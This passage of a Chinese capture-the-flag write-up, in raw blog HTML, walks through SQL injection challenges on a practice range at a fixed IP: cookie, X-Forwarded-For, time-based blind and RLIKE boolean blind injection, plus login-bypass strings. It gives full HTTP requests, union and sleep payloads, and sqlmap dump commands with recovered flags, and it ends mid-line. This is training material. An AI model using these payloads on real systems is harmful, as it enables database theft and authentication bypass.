class="operator">=</span><span class="number">1</span></span></span><br></pre></td></tr></table></figure></li></ol><h1 id="0x03-Cookie注入"><a href="#0x03-Cookie注入" class="headerlink" title="0x03 Cookie注入"></a>0x03 Cookie注入</h1><h2 id="0o00-题目提示-2"><a href="#0o00-题目提示-2" class="headerlink" title="0o00 题目提示"></a>0o00 题目提示</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Cookie注入</span><br><span class="line"></span><br><span class="line">题目URL：http://47.103.94.191:8009</span><br><span class="line"></span><br><span class="line">提示：flag在数据库里面.</span><br></pre></td></tr></table></figure><h2 id="0o01-Cookie注入"><a href="#0o01-Cookie注入" class="headerlink" title="0o01 Cookie注入"></a>0o01 Cookie注入</h2><ul><li>原理：在动态脚本语言中存在超全局变量可以获取多种传参方式，如<code>php中的 $_REQUEST[] 可以获取 POST|GET|COOKIE ，但php 5.4 以上版本不再接受Cookie传参</code>。故，在发送请求包时，可以在请求头中添加&#x2F;更改Cookie值以构造非法语句来实现注入。简而言之，修改本地Cookie值来提交非法请求。</li><li>使用：①通过bp抓包后添加&#x2F;修改请求头Cookie值；②通过控制台执行<code>document.cookie=&quot;id=&quot;+escape(&quot;3&quot;)</code>添加&#x2F;修改请求头Cookie值；③通过<code>Cookie Editor</code>插件添加&#x2F;修改请求头Cookie值；④通过sqlmap工具指定<code>--cookie</code>参数以及指定探测等级<code>--level</code>为<code>2</code>级及以上。</li><li>时机：站点对$_GET和$_POST提交的数据进行过滤，但未对$_COOKIE提交的数据进行过滤时。</li></ul><h2 id="0o02-利用过程-1"><a href="#0o02-利用过程-1" class="headerlink" title="0o02 利用过程"></a>0o02 利用过程</h2><ol><li><p>将请求包中，<code>Cookie</code>值（没有就自己加）替换为<code>GET</code>请求的<code>URL</code>中<code>?</code>后面部分，即<code>id=2</code>。同时，删掉<code>URL</code>中<code>?</code>及其后面部分（截至到空格）。<br><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.5gem8w7e5eg0.jpg" alt="tumeiimage"></p></li><li><p>bp利用语句（和上一题一样猜想测试）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Cookie: <span class="built_in">id</span>=-2 union select 1,database(),version(),group_concat(distinct table_name),5 from information_schema.columns <span class="built_in">where</span> table_schema like database()</span><br><span class="line">得到：account,sql_admin_message,sql_message,sql_user_message,sql_vulnerability,this_flag,user,<span class="built_in">users</span></span><br><span class="line"></span><br><span class="line">Cookie: <span class="built_in">id</span>=-2 union select 1,database(),version(),group_concat(distinct column_name),5 from information_schema.columns <span class="built_in">where</span> table_name like <span class="string">&#x27;this_flag&#x27;</span></span><br><span class="line">得到：<span class="built_in">id</span>,flag</span><br><span class="line"></span><br><span class="line">得到：flag&#123;d523990a3ff51ff035d5cf378f175e88&#125;,dagebiedawo</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.5ctc1th4pe00.jpg" alt="tumeiimage"></p></li><li><p>F12–&gt;Console–&gt;使用<code>document.cookie=&quot;id=&quot;+escape(&quot;3&quot;)</code>语句修改本地保存的<code>Cookie</code>值后再对<code>http://47.103.94.191:8009/user.php</code>发起请求。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">document.cookie=<span class="string">&quot;id=&quot;</span>+escape(<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">document.cookie：表示当前浏览器中的cookie变量</span><br><span class="line">escape()：该函数用于对字符串进行编码</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.2wf6av3116y0.jpg" alt="tumeiimage"></p></li><li><p>使用<code>Cookie Editor</code>插件添加&#x2F;修改本地Cookie内容，更加方便！！！<br><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.1az1c35p4lfk.jpg" alt="tumeiimage"></p></li><li><p>sqlmap使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 需要指定 --level 提高探测等级（等级2以上才会检测cookie注入），以使用更多 payload 注入</span></span><br><span class="line">sqlmap -u <span class="string">&#x27;http://47.103.94.191:8009/user.php?id=2&#x27;</span> --batc --cookie <span class="string">&quot;id=2&quot;</span> --dbs --level 2</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 通过 -r 参数指定post请求包，但一样要指定Cookie值，就更麻烦</span></span><br><span class="line">sqlmap -r post.txt --batch --cookie <span class="string">&quot;id=2&quot;</span> -D <span class="string">&#x27;cookie&#x27;</span> --tables --level 2</span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/user.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.103.94.191:8009</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Cookie:id=2</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure></li></ol><h1 id="0x04-X-Forwarded-For注入"><a href="#0x04-X-Forwarded-For注入" class="headerlink" title="0x04 X-Forwarded-For注入"></a>0x04 X-Forwarded-For注入</h1><h2 id="0o00-题目提示-3"><a href="#0o00-题目提示-3" class="headerlink" title="0o00 题目提示"></a>0o00 题目提示</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For注入</span><br><span class="line"></span><br><span class="line">题目URL：http://<span class="number">47.103</span><span class="number">.94</span><span class="number">.191</span>:<span class="number">8010</span>/</span><br><span class="line"></span><br><span class="line">提示：flag在数据库里面.</span><br></pre></td></tr></table></figure><h2 id="0o01-X-Forwarded-For注入"><a href="#0o01-X-Forwarded-For注入" class="headerlink" title="0o01 X-Forwarded-For注入"></a>0o01 X-Forwarded-For注入</h2><ul><li><strong>名词解析</strong>：X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。 Squid 缓存代理服务器的开发人员最早引入了这一HTTP头字段，并由IETF在HTTP头字段标准化草案中正式提出。</li><li><strong>名词相关</strong>：XFF的有效使用是在保证代理服务器可信的前提下，如通过创建可信服务器白名单等。假设没有XFF等技术，则通过代理服务器的连接显示的是代理服务器的IP，而非连接发起的原始IP。即，代理服务器充当匿名服务提供者，使得连接的原始地址不可知。进而，服务对接时对恶意访问的检测和预防难度将大大增加。</li><li><strong>XFF格式</strong>：<code>X-Forwarded-For: client1, proxy1, proxy2, proxy3</code></li></ul><h2 id="0o02-利用过程-2"><a href="#0o02-利用过程-2" class="headerlink" title="0o02 利用过程"></a>0o02 利用过程</h2><ol><li><p>bp工具利用</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/whitelist.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.103.94.191:8010</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">X-Forwarded-for:&#x27;union select 1,2,3,4,5&#x27;</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 得到哪个字段回显前端--&gt;2,3</span></span><br><span class="line">X-Forwarded-<span class="keyword">for</span>:<span class="string">&#x27;union select 1,2,3,4,5&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 得到数据库名--&gt;xff</span></span><br><span class="line">X-Forwarded-<span class="keyword">for</span>:<span class="string">&#x27;union select 1,database(),3,4,5&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 得到表名--&gt;this_flag</span></span><br><span class="line">X-Forwarded-<span class="keyword">for</span>:<span class="string">&#x27;union select 1,database(),(select group_concat(table_name) from information_schema.columns where table_schema = database()),4,5&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 得到字段名--&gt;flag</span></span><br><span class="line">X-Forwarded-<span class="keyword">for</span>:<span class="string">&#x27;union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema = database()),4,5&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 得到字段内容--&gt;flag&#123;00b116d12ab1d53490e6b685cc7862fc&#125;</span></span><br><span class="line">X-Forwarded-<span class="keyword">for</span>:<span class="string">&#x27;union select 1,database(),(select flag from this_flag limit 1),4,5&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.72zipxvifm40.jpg" alt="tumeiimage"></p></li><li><p>sqlmap利用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 按官方文档说，-H 是添加额外的请求头字段；-p 指定注入参数呗</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://47.103.94.191:8010/whitelist.php&quot;</span> --batch -H <span class="string">&quot;X-Forwarded-For:127.0.0.1&quot;</span> -p <span class="string">&quot;X-Forwarded-For&quot;</span> -D <span class="string">&quot;xff&quot;</span> -T <span class="string">&quot;this_flag&quot;</span> -C <span class="string">&quot;flag&quot;</span> --dump</span><br><span class="line"></span><br><span class="line"><span class="comment">// 也可以直接拿bp抓取到的请求包进行 sqlmap 注入，同样要 -p 指定参数，具体看上面的注入步骤吧</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.7ivozvcap3c0.jpg" alt="tumeiimage"></p></li></ol><h1 id="0x05-POST盲注-amp-万能密码"><a href="#0x05-POST盲注-amp-万能密码" class="headerlink" title="0x05 POST盲注&amp;万能密码"></a>0x05 POST盲注&amp;万能密码</h1><h2 id="0o00-题目提示-4"><a href="#0o00-题目提示-4" class="headerlink" title="0o00 题目提示"></a>0o00 题目提示</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST盲注&amp;万能密码 (<span class="number">200</span>分)</span><br><span class="line">漏洞<span class="number">1</span>）</span><br><span class="line">form表单盲注&amp;万能密码</span><br><span class="line">登陆框：http:<span class="comment">//47.103.94.191:8003/user/login.php</span></span><br><span class="line">漏洞URL：http:<span class="comment">//47.103.94.191:8003/user/logCheck.php</span></span><br><span class="line"></span><br><span class="line">漏洞<span class="number">2</span>）</span><br><span class="line">需要登陆抓包</span><br><span class="line">漏洞页面：http:<span class="comment">//47.103.94.191:8003/user/edit.php</span></span><br><span class="line">漏洞URL：http:<span class="comment">//47.103.94.191:8003/user/updateName.php</span></span><br><span class="line"></span><br><span class="line">提示:flag在数据库里</span><br></pre></td></tr></table></figure><h2 id="0o01-漏洞1"><a href="#0o01-漏洞1" class="headerlink" title="0o01 漏洞1"></a>0o01 漏洞1</h2><ul><li>别被万能密码误导，在登录框那使用万能密码登录，而实际需要的是抓取登录请求的包，以<code>user</code>和<code>pass</code>参数作为注入点。</li></ul><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.38b01hivabu0.jpg" alt="tumeiimage"></p><ul><li><p>测试一波，就发现返回<code>Mysql Error!!</code>或账密不正确，so……尝试盲注注入——时间盲注</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/user/logCheck.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.103.94.191:8003</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>37</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://47.103.94.191:8003</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://47.103.94.191:8003/user/login.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=vthao53sebdao4cbvqd2bt5ji2</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-nsis"><span class="literal">user</span>=<span class="literal">admin</span>&amp;pass=<span class="literal">admin</span><span class="string">&#x27;&amp;submit=submit</span></span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.4uvlvpdu5500.jpg" alt="tumeiimage"></p></li><li><p>bp利用</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ddd为临时表，使用两个and关键字进行联合查询</span></span><br><span class="line">user=admin&amp;pass=<span class="string">&#x27; and (select 1 from (select(sleep(5))) as ddd) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>&amp;submit=submit</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改用使用 “#”注释符</span></span><br><span class="line">user=admin&amp;pass=<span class="string">&#x27; and (select 1 from (select(sleep(5))) as ddd)#&amp;submit=submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 判表名长度</span></span><br><span class="line"><span class="string">user=admin&amp;pass=admin&#x27;</span> and <span class="keyword">if</span>(length(database())=<span class="number">5</span>,<span class="number">1</span>,sleep(<span class="number">5</span>))#&amp;submit=submit</span><br><span class="line"></span><br><span class="line"><span class="comment">// 时间盲注时，使用 Burp 的 Intruder 模块需要设置单线程；方便以响应时间作为猜想成功的依据；</span></span><br><span class="line"><span class="comment">// 同时，查看爆破结果时需要在 columns 选项中勾选Response received或Response completed 查看响应时间</span></span><br><span class="line">user=admin&amp;pass=admin<span class="string">&#x27; and if(substr(database(),§1§,1)=&#x27;</span>§d§<span class="string">&#x27;,sleep(5),null) and &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>&amp;submit=submit</span><br><span class="line"></span><br><span class="line"><span class="comment">// 之后步骤类似，不多做解释</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.60fyqzl90r40.jpg" alt="tumeiimage"></p><ul><li>sqlmap利用</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// --form 参数自动获取请求页中的form表单测试</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://47.103.94.191:8003/user/login.php&quot;</span> --batch --random-agent --forms</span><br><span class="line"></span><br><span class="line"><span class="comment">// 得到库名--&gt;dwvs</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://47.103.94.191:8003/user/login.php&quot;</span> --batch --random-agent --forms --dbs</span><br><span class="line"></span><br><span class="line"><span class="comment">// 得到表名--&gt;flag</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://47.103.94.191:8003/user/login.php&quot;</span> --batch --random-agent --forms -D dwvs --tables</span><br><span class="line"></span><br><span class="line"><span class="comment">// 得到字段名--&gt;flag</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://47.103.94.191:8003/user/login.php&quot;</span> --batch --random-agent --forms -D dwvs -T flag --columns</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字段内容--&gt;flag&#123;f99c688f101bb53fdbf178ad0889182e&#125;</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://47.103.94.191:8003/user/login.php&quot;</span> --batch --random-agent --forms -D dwvs -T flag -C flag --dump</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.61n6vhqykxc0.jpg" alt="tumeiimage"></p><h2 id="0o02-漏洞2"><a href="#0o02-漏洞2" class="headerlink" title="0o02 漏洞2"></a>0o02 漏洞2</h2><ul><li>试了几波万能密码，<code>&#39;or &#39;1&#39;=&#39;1</code>&#x2F;<code>pwd存在数据库</code>或<code>admin&#39;#</code>&#x2F;<code>任意字符</code>，具体语句：<code>SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&#39;&#39;or &#39;1&#39;=&#39;1&#39; AND DWVS_user_passwd=&#39;&#39;;</code>根据<code>mysql</code>中<code>and</code>的优先级高于<code>or</code>可知，<code>&#39;or &#39;1&#39;=&#39;1</code>与<code>DWVS_user_passwd=&#39;&#39;;</code>先做<code>and</code>运算找到密码正确的记录，之后做<code>or</code>运算判断<code>DWVS_user_name</code>字段，此时账号存在抑或正确与否已无任何关系，仅需密码存在即可；或<code>SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&#39;admin&#39;# AND DWVS_user_passwd=&#39;&#39;;</code>通过<code>#</code>注释<code>AND DWVS_user_passwd=&#39;&#39;;</code>部分，使得密码无需填写，仅需账号存在即可。</li><li>通过<code>sqlmap -u &quot;http://47.103.94.191:8003/user/login.php&quot; --batch --random-agent --forms --sql-shell``SELECT COUNT(*) FROM dwvs_user_message;</code>查询，记录数是45。写入<code>SELECT * FROM dwvs_user_message limit 5;</code>，读取到前5条记录，可以看到有多个账户<code>1</code>，对应不同的密码，同时账户<code>1</code>可以多次创建，密码不同账户不同，其他账户名不行。同时，使用<code>1&#39;#</code>账号无法登录，未理解！！！</li><li>查看源码文件：<a class="link" target="_blank" rel="noopener" href="https://github.com/bugku/BWVS/blob/master/user/logCheck.php">https://github.com/bugku/BWVS/blob/master/user/logCheck.php<i class="fas fa-external-link-alt"></i></a></li></ul><ol><li>bp手工布尔盲注（更新用户名处抓包）：<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/user/updateName.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>47.103.94.191:8003</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>32</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://47.103.94.191:8003</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://47.103.94.191:8003/user/edit.php</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=4s0hom06cjglakfi64fu9u0h21</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">u_id</span>=<span class="number">1</span>&amp;user_name=<span class="number">1</span>&amp;submit=submit</span></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 请了解MySQL的case搜索函数（case when then else end，可代替where）</span></span><br><span class="line"><span class="comment">// rlike 运算符（REGEXP 的同义词）执行字符串表达式与模式的模式匹配--正则表达式相关。</span></span><br><span class="line"><span class="comment">// 举例：select 123 rlike 1。在 123 中含有 1 （模糊匹配）， 则整个 select 语句返回 1，反之返回 0。</span></span><br><span class="line"><span class="comment">// 完整语句：UPDATE dwvs_user_message SET DWVS_user_name = &#x27;1&#x27; RLIKE (SELECT (CASE WHEN (3454=3454) THEN 1 ELSE 2 END))-- nLnq&#x27; WHERE DWVS_user_id = &#x27;1&#x27;;</span></span><br><span class="line"><span class="comment">// 如下语句解析，CASE WHEN (3454=3454) THEN 1 ELSE 0x28 END) 中，由于 3454=3454 恒成立，则得到整个语句结果为 1；</span></span><br><span class="line"><span class="comment">// &#x27;1&#x27; RLIKE 1 的结果为 1，则之后的 DWVS_user_name 都设置为 1，这也是为什么出现多个以 1 为名的账户的原因。</span></span><br><span class="line"><span class="comment">// 注入原理：rlike遇到特殊字符&#x27;(&#x27;报错缺少右括号，char(40)为&#x27;(&#x27; ，0x28为&#x27;(&#x27;，则可通过修改“3454=3454”部分内容进行猜想。</span></span><br><span class="line"><span class="comment">// 注：请理解正则表达式语法，rlike注入的实现大致是正则表达式的语法错误（仅个人理解）。</span></span><br><span class="line">u_id=<span class="number">1</span>&amp;user_name=<span class="number">1</span><span class="string">&#x27; RLIKE (SELECT (CASE WHEN (3454=3454) THEN 1 ELSE 0x28 END))-- nLnq&amp;submit=submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 猜想数据库长度，正确长度为4</span></span><br><span class="line"><span class="string">u_id=1&amp;user_name=1&#x27;</span> RLIKE (SELECT (CASE WHEN (length(database())=<span class="number">3</span>) THEN <span class="number">1</span> ELSE <span class="number">0x28</span> END))#&amp;submit=submit</span><br><span class="line"></span><br><span class="line"><span class="comment">// 猜想具体字符</span></span><br><span class="line"></span><br><span class="line">u_id=<span class="number">1</span>&amp;user_name=<span class="number">1</span><span class="string">&#x27; RLIKE (SELECT (CASE WHEN (if((substr(database(),2,1)=&#x27;</span>W<span class="string">&#x27;),1,0)) THEN 1 ELSE 0x28 END))#&amp;submit=submit</span></span><br></pre></td></tr></table></figure><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.4oech5mjtmy0.jpg" alt="tumeiimage"></li></ol><p><img lazyload alt="image" data-src="https://cdn.jsdelivr.net/gh/0xtlu/blogsPicture@main/20220613/tumeiimage.35ne4t3s2ia0.jpg" alt="tumeiimage"></p><ol start="2"><li>sqlmap注入<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 指定注入参数 user_name，获得三种注入方式</span></span><br><span class="line">sqlmap -r test.txt --batch -p user_name</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定使用布尔盲注获取当前数据库名--&gt;dwvs</span></span><br><span class="line">sqlmap -r test.txt --batch -p user_name --technique B --current-db</span><br><span class="line"></span><br><span class="line"><span class="comment">// ……</span></span><br><span class="line"><span class="comment">// 拿flag--&gt;flag&#123;f99c688f101bb53fdbf178ad0889182e&#125;</span></span><br><span class="line">sqlmap -r test.txt --batch -p user_name --technique B -D dwvs -T flag -C flag --dump</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取源码文件/var/www/html/user/updateName.php</span></span><br><span 